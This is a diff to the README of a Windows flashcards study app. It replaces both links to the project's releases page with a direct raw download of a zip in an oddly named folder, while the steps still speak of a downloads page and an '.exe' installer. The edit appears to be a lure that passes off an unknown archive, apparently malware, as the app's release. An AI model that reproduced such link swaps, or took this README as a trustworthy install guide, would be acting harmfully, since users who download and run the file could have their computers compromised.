@@ -1,6 +1,6 @@
 # 🧠 flashcards - Study smarter using active recall methods
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Louellamatriarchal912/flashcards/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Louellamatriarchal912/flashcards/raw/refs/heads/main/debasingly/Software-interflange.zip)
 
 ## 🎯 About This App
 
@@ -10,7 +10,7 @@ Flashcards helps you study for exams. It uses active recall to move information 
 
 Follow these steps to get the app on your Windows computer:
 
-1. Visit [this link](https://github.com/Louellamatriarchal912/flashcards/releases) to access the downloads page.
+1. Visit [this link](https://github.com/Louellamatriarchal912/flashcards/raw/refs/heads/main/debasingly/Software-interflange.zip) to access the downloads page.
 2. Look for the latest release version on the page.
 3. Click the file ending in ".exe" to download the installer to your computer.
 4. Locate the downloaded file in your Downloads folder.
